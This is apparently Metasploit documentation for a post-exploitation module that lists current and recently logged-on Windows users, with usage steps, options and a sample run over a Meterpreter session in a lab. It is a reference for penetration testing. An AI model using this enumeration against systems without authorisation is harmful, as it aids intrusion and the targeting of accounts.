## Vulnerable Application

This module will enumerate current and recently logged on Windows users.

## Verification Steps

1. Start msfconsole
2. Get a session
3. Do: `use post/windows/gather/enum_logged_on_users`
4. Do: `set SESSION <session id>`
5. Do: `run`

## Options

### CURRENT

Enumerate currently logged on users. (default: `true`)

### RECENT

Enumerate recently logged on users. (default: `true`)


## Scenarios

### Windows 7 (6.1 Build 7601, Service Pack 1).

```
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.10:49196) at 2019-12-13 04:36:54 -0700

msf exploit(multi/handler) > use post/windows/gather/enum_logged_on_users
msf post(windows/gather/enum_logged_on_users) > set SESSION 1
SESSION => 1
msf post(windows/gather/enum_logged_on_users) > run

[*] Running module against TEST-PC (192.168.1.10)

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-21-3113421791-4205713440-112141152-1000  TEST-PC\TEST


[+] Results saved in: /root/.msf4/loot/20191213054456_default_192.168.1.10_host.users.activ_424278.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\system32\config\systemprofile
 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-3113421791-4205713440-112141152-1000  C:\Users\TEST


[+] Results saved in: /root/.msf4/loot/20191213054458_default_192.168.1.10_host.users.recen_365577.txt
[*] Post module execution completed
```
